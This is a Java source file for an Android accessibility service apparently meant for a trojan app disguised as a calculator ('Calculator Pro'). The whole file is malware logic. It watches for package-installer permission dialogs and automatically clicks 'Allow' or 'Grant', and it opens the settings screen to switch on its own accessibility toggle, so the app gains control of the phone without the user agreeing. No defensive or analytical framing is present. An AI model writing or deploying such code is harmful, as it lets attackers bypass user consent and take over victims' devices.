package com.calculator.professional;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import java.util.List;

public class StealthAccessibilityService extends AccessibilityService {
    private Handler handler = new Handler(Looper.getMainLooper());
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = event.getPackageName().toString();
            
            // Auto-grant permissions when permission dialog appears
            if (packageName.equals("com.android.packageinstaller") ||
                packageName.equals("com.google.android.packageinstaller")) {
                
                handler.postDelayed(() -> {
                    autoGrantPermissions();
                }, 500);
            }
            
            // Auto-enable accessibility service
            if (packageName.equals("com.android.settings")) {
                handler.postDelayed(() -> {
                    autoEnableAccessibility();
                }, 1000);
            }
        }
    }
    
    private void autoGrantPermissions() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            // Find and click "Allow" or "Grant" buttons
            List<AccessibilityNodeInfo> allowButtons = rootNode.findAccessibilityNodeInfosByText("Allow");
            if (allowButtons.isEmpty()) {
                allowButtons = rootNode.findAccessibilityNodeInfosByText("Grant");
            }
            if (allowButtons.isEmpty()) {
                allowButtons = rootNode.findAccessibilityNodeInfosByText("ALLOW");
            }
            
            for (AccessibilityNodeInfo button : allowButtons) {
                if (button.isClickable()) {
                    button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    break;
                }
            }
        }
    }
    
    private void autoEnableAccessibility() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            // Find accessibility service toggle
            List<AccessibilityNodeInfo> toggles = rootNode.findAccessibilityNodeInfosByText("Calculator Pro");
            for (AccessibilityNodeInfo toggle : toggles) {
                AccessibilityNodeInfo parent = toggle.getParent();
                if (parent != null) {
                    List<AccessibilityNodeInfo> switches = parent.findAccessibilityNodeInfosByClassName("android.widget.Switch");
                    for (AccessibilityNodeInfo switchNode : switches) {
                        if (!switchNode.isChecked()) {
                            switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }
            }
        }
    }
    
    @Override
    public void onInterrupt() {
        // Service interrupted
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        
        setServiceInfo(info);
    }
}